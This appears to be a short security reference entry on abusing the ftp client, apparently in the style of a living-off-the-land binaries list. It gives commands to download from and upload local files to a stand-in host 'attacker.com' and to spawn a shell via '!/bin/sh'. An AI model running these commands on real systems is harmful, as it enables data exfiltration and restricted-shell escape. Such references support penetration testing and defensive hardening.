title: ftp
html:
ftp

Download

Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.

ftp -a attacker.com
get /path/to/input-file output-file

Shell

ftp
!/bin/sh

Upload

Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.

ftp -a attacker.com
put /path/to/input-file output-file
